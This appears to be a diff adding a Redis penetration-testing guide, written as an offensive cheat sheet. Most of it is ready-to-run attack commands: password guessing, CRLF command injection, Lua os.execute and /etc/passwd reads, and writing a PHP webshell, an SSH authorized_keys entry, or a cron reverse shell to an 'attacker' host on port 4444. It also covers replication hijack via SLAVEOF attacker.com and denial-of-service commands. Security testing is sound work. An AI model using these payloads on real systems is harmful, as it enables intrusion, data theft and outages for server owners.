@@ -1,0 +1,378 @@
+<redis_security_guide>
+<title>REDIS SECURITY TESTING</title>
+
+<critical>Redis is an in-memory data structure store used for caching, sessions, and real-time applications. Security vulnerabilities include unauthorized access, command injection, Lua script exploitation, and data exposure. Many Redis instances are deployed without authentication or with weak security configurations.</critical>
+
+<scope>
+- Unauthorized access and authentication bypass
+- Command injection through application inputs
+- Lua scripting vulnerabilities
+- Pub/Sub channel security
+- Cluster and replication security
+- Data exposure and information leakage
+- Denial of service attacks
+- Redis Modules security
+</scope>
+
+<methodology>
+1. Identify Redis instances and connection methods.
+2. Test for unauthenticated access.
+3. Probe for command injection through application interfaces.
+4. Analyze Lua scripts for vulnerabilities.
+5. Test cluster and replication configurations.
+</methodology>
+
+<reconnaissance>
+<instance_discovery>
+{% raw %}
+# Default ports:
+6379  # Default Redis port
+6380  # Common alternate port
+26379 # Redis Sentinel
+
+# Network scanning:
+nmap -p 6379,6380 -sV target.com
+masscan -p 6379 10.0.0.0/8
+
+# Shodan queries:
+product:redis
+port:6379 redis
+redis country:US
+
+# Cloud Redis services:
+# AWS ElastiCache
+# Azure Cache for Redis
+# Google Cloud Memorystore
+{% endraw %}
+</instance_discovery>
+
+<connection_testing>
+{% raw %}
+# Direct connection test:
+redis-cli -h target.com -p 6379
+
+# Check authentication requirement:
+redis-cli -h target.com PING
+# "PONG" = no auth required
+# "NOAUTH" = auth required
+
+# Info command (if accessible):
+redis-cli -h target.com INFO
+
+# Basic enumeration:
+redis-cli -h target.com CONFIG GET *
+redis-cli -h target.com DBSIZE
+redis-cli -h target.com KEYS *
+{% endraw %}
+</connection_testing>
+</reconnaissance>
+
+<unauthorized_access>
+<no_authentication>
+{% raw %}
+# Test for unauthenticated access:
+redis-cli -h target.com
+> PING
+PONG
+> INFO
+# Server information exposed
+
+# Data enumeration:
+> KEYS *
+> SCAN 0 COUNT 1000
+> TYPE keyname
+> GET keyname
+
+# Session data exposure:
+> KEYS session:*
+> GET session:abc123
+
+# Configuration exposure:
+> CONFIG GET *
+> CONFIG GET requirepass
+{% endraw %}
+</no_authentication>
+
+<weak_authentication>
+{% raw %}
+# Common weak passwords:
+redis-cli -h target.com -a redis
+redis-cli -h target.com -a password
+redis-cli -h target.com -a admin
+redis-cli -h target.com -a root
+redis-cli -h target.com -a foobared
+
+# Default password list:
+foobared
+redis
+admin
+password
+123456
+root
+secret
+{% endraw %}
+</weak_authentication>
+</unauthorized_access>
+
+<command_injection>
+<application_level>
+{% raw %}
+# If application uses user input in Redis commands:
+
+# Key name injection:
+userkey = user_input + "_data"
+# Input: foo\r\nFLUSHALL\r\nGET foo
+# Becomes: GET foo_data -> FLUSHALL -> GET foo_data
+
+# EVAL injection:
+# If user input in Lua scripts:
+EVAL "return redis.call('GET', KEYS[1])" 1 user_input
+# Input: key'); os.execute('id'); --
+
+# SET injection:
+SET user_input value
+# Input: foo EX 1 NX
+# Becomes: SET foo EX 1 NX value
+{% endraw %}
+</application_level>
+
+<crlf_injection>
+{% raw %}
+# CRLF in Redis commands:
+# Input: foo\r\nCONFIG SET dir /tmp\r\nCONFIG SET dbfilename shell.php\r\nSET shell "<?php system($_GET['cmd']); ?>"\r\nSAVE\r\n
+
+# URL encoded:
+foo%0d%0aCONFIG%20SET%20dir%20/tmp%0d%0a...
+
+# If application constructs Redis commands:
+GET key + user_input
+# Inject additional commands via CRLF
+{% endraw %}
+</crlf_injection>
+</command_injection>
+
+<lua_exploitation>
+<lua_script_attacks>
+{% raw %}
+# Lua script execution:
+EVAL "return 1" 0
+
+# File system access (if available):
+EVAL "local f = io.open('/etc/passwd', 'r'); return f:read('*a')" 0
+
+# Command execution (restricted in newer versions):
+EVAL "return os.execute('id')" 0
+
+# Sandbox bypass attempts:
+EVAL "return loadstring('os.execute(\"id\")')" 0
+EVAL "return debug.traceback()" 0
+
+# Resource exhaustion:
+EVAL "while true do end" 0
+EVAL "local x = ''; for i=1,10000000 do x = x .. 'A' end; return x" 0
+{% endraw %}
+</lua_script_attacks>
+
+<script_injection>
+{% raw %}
+# If application uses EVALSHA with user input:
+
+# Stored script manipulation:
+SCRIPT LOAD "return redis.call('GET', KEYS[1])"
+# Returns SHA1 hash
+
+# If SHA1 can be manipulated:
+EVALSHA <injected_sha> 1 key
+{% endraw %}
+</script_injection>
+</lua_exploitation>
+
+<file_write_attacks>
+<webshell_write>
+{% raw %}
+# Write webshell via Redis:
+
+# Step 1: Set output directory
+CONFIG SET dir /var/www/html/
+
+# Step 2: Set output filename
+CONFIG SET dbfilename shell.php
+
+# Step 3: Write payload
+SET payload "<?php system($_GET['cmd']); ?>"
+
+# Step 4: Save to disk
+SAVE
+
+# Result: Webshell at /var/www/html/shell.php
+{% endraw %}
+</webshell_write>
+
+<ssh_key_injection>
+{% raw %}
+# Write SSH key for access:
+
+# Step 1: Generate SSH key
+ssh-keygen -t rsa -f redis_key
+
+# Step 2: Create Redis payload
+(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt
+
+# Step 3: Set key in Redis
+SET sshkey "\n\nssh-rsa AAAA... user@host\n\n"
+
+# Step 4: Write to authorized_keys
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SAVE
+{% endraw %}
+</ssh_key_injection>
+
+<cron_injection>
+{% raw %}
+# Write cron job:
+
+# Set cron payload
+SET cronpayload "\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n"
+
+# Write to cron directory
+CONFIG SET dir /etc/cron.d/
+CONFIG SET dbfilename redis_cron
+SAVE
+{% endraw %}
+</cron_injection>
+</file_write_attacks>
+
+<pub_sub_attacks>
+<channel_security>
+{% raw %}
+# Subscribe to all channels:
+PSUBSCRIBE *
+
+# Listen for sensitive data:
+SUBSCRIBE session_updates
+SUBSCRIBE user_events
+SUBSCRIBE payment_notifications
+
+# Channel enumeration:
+PUBSUB CHANNELS *
+PUBSUB NUMSUB channel1 channel2
+
+# Message injection:
+PUBLISH session_updates "malicious_data"
+{% endraw %}
+</channel_security>
+</pub_sub_attacks>
+
+<cluster_attacks>
+<cluster_exploitation>
+{% raw %}
+# Cluster enumeration:
+CLUSTER INFO
+CLUSTER NODES
+CLUSTER SLOTS
+
+# Cross-slot operations:
+# Attempt to access keys across slots
+
+# Master-slave replication attacks:
+SLAVEOF attacker.com 6379
+# Redirect replication to attacker-controlled server
+
+# Cluster state manipulation:
+CLUSTER FAILOVER
+CLUSTER RESET
+{% endraw %}
+</cluster_exploitation>
+</cluster_attacks>
+
+<denial_of_service>
+<resource_exhaustion>
+{% raw %}
+# Memory exhaustion:
+SET large_key $(python -c "print('A'*10000000)")
+# Repeat to fill memory
+
+# CPU exhaustion:
+DEBUG SLEEP 100
+KEYS *  # On large databases
+
+# Connection exhaustion:
+# Open maximum connections without closing
+
+# Slow query attacks:
+SORT large_list
+KEYS pattern*  # Complex patterns
+{% endraw %}
+</resource_exhaustion>
+</denial_of_service>
+
+<common_payloads>
+{% raw %}
+# Unauthenticated access test:
+redis-cli -h target PING
+
+# Data enumeration:
+KEYS *
+SCAN 0 COUNT 1000
+
+# Command injection:
+foo\r\nFLUSHALL\r\nGET foo
+
+# Webshell write:
+CONFIG SET dir /var/www/html/
+CONFIG SET dbfilename shell.php
+SET x "<?php system($_GET['c']);?>"
+SAVE
+
+# SSH key injection:
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SET key "\n\nssh-rsa AAAA...\n\n"
+SAVE
+
+# Lua execution:
+EVAL "return os.execute('id')" 0
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate unauthenticated access with data retrieval.
+2. Show command injection through application input.
+3. Prove file write capability with webshell or SSH key.
+4. Document Lua script exploitation with code execution.
+5. Provide evidence of sensitive data exposure (sessions, credentials).
+</validation>
+
+<false_positives>
+- Redis behind proper network segmentation
+- Strong authentication with complex password
+- Dangerous commands disabled (RENAME or disable)
+- Protected mode enabled (local connections only)
+- ACL rules restricting command access
+</false_positives>
+
+<impact>
+- Complete data exposure (sessions, cache, user data)
+- Remote code execution via file write
+- Server compromise via SSH key injection
+- Denial of service through resource exhaustion
+- Lateral movement via cluster exploitation
+- Application compromise through session manipulation
+</impact>
+
+<pro_tips>
+1. Always test for unauthenticated access first.
+2. CONFIG SET dir/dbfilename is the path to RCE.
+3. Check for dangerous commands: DEBUG, CONFIG, EVAL.
+4. Pub/Sub channels may leak sensitive real-time data.
+5. Protected mode only blocks non-local connections.
+6. ACLs in Redis 6+ provide granular access control.
+7. Sentinel instances may have different auth than Redis.
+8. Cloud Redis services have different security models.
+9. CRLF injection bypasses many application sanitizers.
+10. Lua sandbox has been bypassed in older versions.
+</pro_tips>
+
+<remember>Redis security fundamentally depends on network isolation and authentication. Many deployments expose Redis without auth, enabling trivial data access and potential RCE through file writes. Always test for unauthenticated access and dangerous command availability.</remember>
+</redis_security_guide>
